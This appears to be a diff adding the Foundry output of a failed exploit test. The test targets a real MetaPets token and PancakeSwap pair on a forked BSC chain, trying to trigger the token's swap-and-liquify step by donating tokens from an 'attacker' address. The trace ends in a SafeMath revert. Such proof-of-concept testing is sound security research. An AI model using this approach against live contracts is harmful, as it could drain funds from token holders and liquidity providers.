@@ -1,0 +1,55 @@
+No files changed, compilation skipped
+2026-06-16T10:36:28.808335Z  WARN foundry_fork_db::cache: Failed to read cache file err=Os { code: 2, kind: NotFound, message: "No such file or directory" } path="/Users/carl/.foundry/cache/rpc/bsc/104551339"
+
+Ran 1 test for test/Exploit.t.sol:ExploitTest
+[FAIL: Pancake: TRANSFER_FAILED] test_TriggerSwapAndLiquifyByDonatingTokens() (gas: 318231)
+2026-06-16T10:36:45.629386Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T10:36:45.629670Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T10:36:45.629828Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T10:36:45.629912Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T10:36:45.635204Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+Traces:
+  [7775] ExploitTest::setUp()
+    ├─ [0] VM::label(MetaPets: [0x24cE3d571fBcFD9D81dc0e1a560504636a4D046d], "MetaPets")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(UniswapV2Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], "UniswapV2Router")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(attacker: [0x000000000000000000000000000000000000dEaD], "attacker")
+    │   └─ ← [Return]
+    ├─ [0] VM::deal(attacker: [0x000000000000000000000000000000000000dEaD], 100000000000000000000 [1e20])
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [318231] ExploitTest::test_TriggerSwapAndLiquifyByDonatingTokens()
+    ├─ [0] VM::startPrank(attacker: [0x000000000000000000000000000000000000dEaD])
+    │   └─ ← [Return]
+    ├─ [299226] UniswapV2Router::swapExactETHForTokensSupportingFeeOnTransferTokens{value: 1000000000000000000}(0, [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0x24cE3d571fBcFD9D81dc0e1a560504636a4D046d], attacker: [0x000000000000000000000000000000000000dEaD], 1781606184 [1.781e9])
+    │   ├─ [23974] WBNB::deposit{value: 1000000000000000000}()
+    │   │   ├─ emit Deposit(dst: UniswapV2Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], wad: 1000000000000000000 [1e18])
+    │   │   └─ ← [Stop]
+    │   ├─ [8062] WBNB::transfer(PancakePair: [0x5f29d7f11737455E8E6043944Bb62aec6e6E52d4], 1000000000000000000 [1e18])
+    │   │   ├─ emit Transfer(from: UniswapV2Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], to: PancakePair: [0x5f29d7f11737455E8E6043944Bb62aec6e6E52d4], value: 1000000000000000000 [1e18])
+    │   │   └─ ← [Return] true
+    │   ├─ [59188] MetaPets::balanceOf(attacker: [0x000000000000000000000000000000000000dEaD]) [staticcall]
+    │   │   └─ ← [Return] 3010937728329457323413431 [3.01e24]
+    │   ├─ [2893] PancakePair::getReserves() [staticcall]
+    │   │   └─ ← [Return] 675310567367146605599870 [6.753e23], 2828710725579730634 [2.828e18], 1671659203 [1.671e9]
+    │   ├─ [534] WBNB::balanceOf(PancakePair: [0x5f29d7f11737455E8E6043944Bb62aec6e6E52d4]) [staticcall]
+    │   │   └─ ← [Return] 3828710725579730634 [3.828e18]
+    │   ├─ [184153] PancakePair::swap(176054676352584958567675 [1.76e23], 0, attacker: [0x000000000000000000000000000000000000dEaD], 0x)
+    │   │   ├─ [172386] MetaPets::transfer(attacker: [0x000000000000000000000000000000000000dEaD], 176054676352584958567675 [1.76e23])
+    │   │   │   ├─ emit Transfer(from: PancakePair: [0x5f29d7f11737455E8E6043944Bb62aec6e6E52d4], to: 0xf93F51AA34F8A8bC80b3FB543042fFDA5186e55A, value: 0)
+    │   │   │   └─ ← [Revert] SafeMath: subtraction overflow
+    │   │   └─ ← [Revert] Pancake: TRANSFER_FAILED
+    │   └─ ← [Revert] Pancake: TRANSFER_FAILED
+    └─ ← [Revert] Pancake: TRANSFER_FAILED
+
+Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 16.82s (13.99s CPU time)
+
+Ran 1 test suite in 20.20s (16.82s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)
+
+Failing tests:
+Encountered 1 failing test in test/Exploit.t.sol:ExploitTest
+[FAIL: Pancake: TRANSFER_FAILED] test_TriggerSwapAndLiquifyByDonatingTokens() (gas: 318231)
+
+Encountered a total of 1 failing tests, 0 tests succeeded
